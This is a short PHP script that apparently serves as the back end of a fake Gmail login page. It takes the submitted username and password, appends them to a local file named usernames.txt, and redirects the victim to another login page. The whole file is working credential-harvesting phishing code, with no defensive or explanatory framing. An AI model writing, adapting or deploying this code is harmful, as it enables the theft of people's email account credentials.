<?php

file_put_contents("usernames.txt", "Gmail : " . $_POST['username'] . "  || Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: ./login3.html');
exit();
